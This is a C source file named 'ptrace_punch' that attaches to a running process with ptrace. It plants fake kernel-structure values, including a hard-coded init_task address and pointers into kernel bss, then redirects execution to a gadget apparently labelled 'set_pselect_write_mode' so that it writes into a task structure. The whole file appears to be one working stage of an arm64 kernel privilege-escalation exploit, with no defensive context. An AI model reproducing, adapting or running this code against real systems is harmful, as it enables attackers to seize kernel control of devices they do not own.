#define _GNU_SOURCE
#include <elf.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef NT_PRSTATUS
#define NT_PRSTATUS 1
#endif
#ifndef PTRACE_GETREGSET
#define PTRACE_GETREGSET 0x4204
#endif
#ifndef PTRACE_SETREGSET
#define PTRACE_SETREGSET 0x4205
#endif

/* user_pt_regs comes from asm/ptrace.h via sys/ptrace.h */

static int poke64(pid_t pid, uint64_t addr, uint64_t val) {
  errno = 0;
  long r = ptrace(PTRACE_POKEDATA, pid, (void *)addr, (void *)val);
  if (r == -1 && errno) {
    printf("POKE %016llx val=%016llx errno=%d\n", (unsigned long long)addr,
           (unsigned long long)val, errno);
    return -1;
  }
  return 0;
}

int main(int argc, char **argv) {
  if (argc < 3) {
    fprintf(stderr, "usage: ptrace_punch <pid> <task>\n");
    return 1;
  }
  pid_t pid = (pid_t)atoi(argv[1]);
  uint64_t task = strtoull(argv[2], NULL, 0);
  uint64_t slot = task + 0x780;
  uint64_t bias = 0x5c5fae0000ULL;
  uint64_t fake_lock_a = bias + 0x48cd0;
  uint64_t fake_task_a = bias + 0x48ce0;
  uint64_t fake_fops_a = bias + 0x48ce8;
  uint64_t page_base_a = bias + 0x48d30;
  uint64_t child_node_a = bias + 0x48cf0;
  uint64_t pc_punch = bias + 0x17cd4; /* bl set_pselect_write_mode */
  uint64_t init_task = 0xffffff802a7cc000ULL;
  uint64_t bss_tail = 0xffffff802abb9d00ULL;

  printf("attach pid=%d task=%016llx slot=%016llx pc=%016llx\n", (int)pid,
         (unsigned long long)task, (unsigned long long)slot,
         (unsigned long long)pc_punch);
  errno = 0;
  if (ptrace(PTRACE_ATTACH, pid, 0, 0) != 0) {
    printf("ATTACH errno=%d\n", errno);
    return 1;
  }
  int st = 0;
  waitpid(pid, &st, 0);
  printf("stopped status=%d\n", st);

  if (poke64(pid, fake_task_a, init_task) || poke64(pid, fake_lock_a, bss_tail) ||
      poke64(pid, fake_fops_a, bss_tail) || poke64(pid, page_base_a, bss_tail) ||
      poke64(pid, child_node_a, 1)) {
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return 1;
  }
  printf("overlay poked lock=%016llx\n", (unsigned long long)bss_tail);

  struct user_pt_regs r;
  memset(&r, 0, sizeof(r));
  struct iovec iov = {.iov_base = &r, .iov_len = sizeof(r)};
  if (ptrace(PTRACE_GETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov) != 0) {
    printf("GETREGSET errno=%d\n", errno);
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return 1;
  }
  printf("old pc=%016llx sp=%016llx x0=%016llx x20=%016llx x27=%016llx x30=%016llx\n",
         (unsigned long long)r.pc, (unsigned long long)r.sp,
         (unsigned long long)r.regs[0], (unsigned long long)r.regs[20],
         (unsigned long long)r.regs[27], (unsigned long long)r.regs[30]);

  r.regs[0] = slot;
  r.regs[1] = 0;
  r.regs[2] = 4;
  r.regs[20] = slot;
  r.pc = pc_punch;
  iov.iov_base = &r;
  iov.iov_len = sizeof(r);
  if (ptrace(PTRACE_SETREGSET, pid, (void *)(long)NT_PRSTATUS, &iov) != 0) {
    printf("SETREGSET errno=%d\n", errno);
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return 1;
  }
  printf("SET pc=punch x0=slot — cont\n");
  fflush(stdout);
  if (ptrace(PTRACE_CONT, pid, 0, 0) != 0) {
    printf("CONT errno=%d\n", errno);
    return 1;
  }
  /* Do not wait forever; parent continues. */
  return 0;
}
